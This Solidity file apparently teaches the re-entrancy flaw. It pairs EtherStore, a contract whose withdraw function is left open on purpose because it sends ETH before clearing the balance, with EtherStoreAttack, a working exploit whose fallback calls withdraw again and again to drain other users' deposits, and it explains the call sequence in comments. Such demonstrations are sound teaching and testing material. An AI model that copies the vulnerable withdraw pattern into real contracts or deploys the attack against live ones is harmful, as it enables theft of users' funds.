// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "../node_modules/hardhat/console.sol";

/*
EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy EtherStoreAttack with address of EtherStore
4. Call EtherStoreAttack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
EtherStoreAttack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- EtherStoreAttack.attack
- EtherStore.deposit
- EtherStore.withdraw
- EtherStoreAttack fallback (receives 1 Ether)
- EtherStore.withdraw
- EtherStoreAttack.fallback (receives 1 Ether)
- EtherStore.withdraw
- EtherStoreAttack fallback (receives 1 Ether)
*/

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        console.log(
            "EtherStore.deposit(): %d deposited by %s",
            msg.value,
            msg.sender
        );
        console.log("EtherStore balance is %d", address(this).balance);
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);
        console.log("EtherStore.withdraw(): sending %d to %s", bal, msg.sender);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
        console.log("EtherStore balance is %d", address(this).balance);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract EtherStoreAttack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
        console.log(
            "In Attack.constructor() : Attack balance is %d",
            address(this).balance
        );
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            console.log(
                "EtherStoreAttack.fallback() called: receiving %d from %s",
                msg.value,
                msg.sender
            );
            console.log(
                "EtherStoreAttack balance before EtherStore.withdraw() is %d",
                address(this).balance
            );
            etherStore.withdraw();
        }
        console.log(
            "EtherStoreAttack balance after EtherStore.withdraw() is %d",
            address(this).balance
        );
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        console.log(
            "EtherStoreAttack.attack(): calling EtherStore.deposit() 1 ether from %s",
            msg.sender
        );
        console.log(
            "EtherStoreAttack balance before deposit is %d",
            address(this).balance
        );
        etherStore.deposit{value: 1 ether}();
        console.log(
            "EtherStoreAttack balance after deposit is %d",
            address(this).balance
        );
        console.log(
            "EtherStoreAttack.attack(): calling EtherStore.withdraw() from %s",
            msg.sender
        );
        etherStore.withdraw();
        console.log(
            "EtherStoreAttack balance after EtherStore.withdraw() is %d",
            address(this).balance
        );
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // function used to send the Attack balance to the attacking account,
    // in order to recuperate the ethers used
    function send() external payable {
        uint256 bal = address(this).balance;
        console.log(
            "EtherStoreAttack balance before recup is %d",
            address(this).balance
        );
        (bool sent, ) = msg.sender.call{value: bal}("");
        console.log(
            "EtherStoreAttack balance after recup is %d",
            address(this).balance
        );
    }
}
